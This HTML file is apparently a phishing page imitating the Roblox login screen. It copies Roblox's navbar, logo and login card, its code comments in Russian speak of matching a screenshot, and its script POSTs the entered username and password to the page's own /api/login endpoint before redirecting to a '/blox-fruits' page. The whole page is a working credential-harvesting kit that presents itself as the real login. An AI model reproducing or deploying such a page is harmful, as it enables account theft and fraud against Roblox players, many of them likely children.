<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #0d0f12; color: #fff; display: flex; flex-direction: column; min-height: 100vh; position: relative; overflow-x: hidden; }
        
        /* Фоновое изображение из игр (размытый коллаж) */
        body::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(13, 15, 18, 0.8), rgba(13, 15, 18, 0.9)), 
                        url('https://tr.rbxcdn.com/18GBVF3wF49H-N3d3q85R5J8uGz51D9G0v63R8G1F2s/768/432/Image/Png') no-repeat center center/cover;
            filter: blur(4px);
            z-index: -1;
        }

        /* Верхняя панель */
        .navbar { display: flex; justify-content: space-between; align-items: center; background-color: #121418; padding: 10px 16px; border-bottom: 1px solid #1f232b; }
        .nav-left { display: flex; align-items: center; gap: 14px; }
        .home-icon, .search-icon { font-size: 18px; color: #fff; cursor: pointer; }
        .roblox-logo { background: #fff; color: #000; font-weight: 900; padding: 2px 6px; font-size: 16px; letter-spacing: -1px; }
        .nav-links { display: flex; gap: 12px; font-size: 13px; color: #b4b6bd; font-weight: 500; }
        .nav-right { display: flex; align-items: center; gap: 12px; }
        .signup-btn { background: #0074e8; color: white; border: none; padding: 5px 14px; border-radius: 6px; font-weight: 600; font-size: 13px; cursor: pointer; }

        /* Основной контент */
        .main-content { flex: 1; display: flex; justify-content: center; align-items: center; padding: 16px; }
        .login-card { background: rgba(25, 27, 34, 0.95); padding: 28px 20px; border-radius: 12px; width: 100%; max-width: 390px; text-align: center; border: 1px solid #23262f; box-shadow: 0 8px 30px rgba(0,0,0,0.7); backdrop-filter: blur(10px); }
        
        h2 { font-size: 22px; font-weight: 700; margin-bottom: 22px; color: #fff; }

        .input-group { margin-bottom: 12px; text-align: left; }
        input { width: 100%; padding: 13px 14px; background: #23262f; border: 1px solid #333842; border-radius: 8px; color: #fff; font-size: 14px; outline: none; }
        input::placeholder { color: #828793; }
        input:focus { border-color: #0074e8; background: #1c1f28; }

        .login-btn { background: #23262f; color: #787d8a; border: 1px solid #333842; width: 100%; padding: 13px; border-radius: 8px; font-weight: 700; font-size: 14px; cursor: pointer; margin-top: 4px; transition: 0.2s; }
        .login-btn.active { background: #0074e8; color: #fff; border-color: #0074e8; }

        .forgot-link { display: block; margin: 16px 0; color: #b4b6bd; font-size: 13px; text-decoration: none; }
        .forgot-link:hover { text-decoration: underline; }

        .divider { border: 0; height: 1px; background: #23262f; margin: 18px 0; }

        .secondary-btn { background: #23262f; color: #fff; border: 1px solid #333842; width: 100%; padding: 12px; border-radius: 8px; font-weight: 600; font-size: 13px; cursor: pointer; margin-bottom: 10px; text-align: center; }
        .secondary-btn:hover { background: #2c303d; }

        /* Нижний текст с регистрацией как на скриншоте */
        .signup-footer { margin-top: 20px; font-size: 13px; color: #828793; }
        .signup-footer a { color: #fff; text-decoration: none; font-weight: 600; }
        .signup-footer a:hover { text-decoration: underline; }

        #status { margin-top: 12px; font-size: 13px; font-weight: 500; }
    </style>
</head>
<body>

    <!-- Верхняя шапка -->
    <header class="navbar">
        <div class="nav-left">
            <span class="home-icon">🏠</span>
            <div class="roblox-logo">R</div>
            <div class="nav-links">
                <span>Charts</span>
                <span>Marketplace</span>
                <span>Create</span>
                <span>Robux</span>
            </div>
        </div>
        <div class="nav-right">
            <button class="signup-btn">Sign Up</button>
            <span class="search-icon">🔍</span>
        </div>
    </header>

    <!-- Центр с формой -->
    <div class="main-content">
        <div class="login-card">
            <h2>Login to Roblox</h2>
            
            <div class="input-group">
                <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
            </div>

            <div class="input-group">
                <input type="password" id="passwordInput" placeholder="Password" oninput="checkInputs()">
            </div>

            <button id="loginBtn" class="login-btn" onclick="loginUser()">Log In</button>
            
            <a href="#" class="forgot-link">Forgot Password or Username?</a>

            <hr class="divider">

            <button class="secondary-btn">Email Me a One-Time Code</button>
            <button class="secondary-btn">Quick Sign-in</button>

            <!-- Текст внизу карточки в точности как на вашем фото -->
            <div class="signup-footer">
                Don't have an account? <a href="#">Sign Up</a>
            </div>

            <div id="status"></div>
        </div>
    </div>

    <script>
        function checkInputs() {
            const user = document.getElementById('usernameInput').value.trim();
            const pass = document.getElementById('passwordInput').value.trim();
            const btn = document.getElementById('loginBtn');
            if (user && pass) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        }

        async function loginUser() {
            const username = document.getElementById('usernameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const statusDiv = document.getElementById('status');

            if (!username || !password) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Please fill in all fields.';
                return;
            }

            statusDiv.style.color = '#9ca3af';
            statusDiv.innerText = 'Logging in...';

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });

                const data = await response.json();

                if (response.ok) {
                    statusDiv.style.color = '#22c55e';
                    statusDiv.innerText = 'Success! Redirecting...';
                    
                    setTimeout(() => {
                        window.location.href = '/blox-fruits';
                    }, 1500);

                } else {
                    statusDiv.style.color = '#ef4444';
                    statusDiv.innerText = data.error || 'Login failed';
                }
            } catch (err) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Connection error.';
            }
        }
    </script>

</body>
</html>
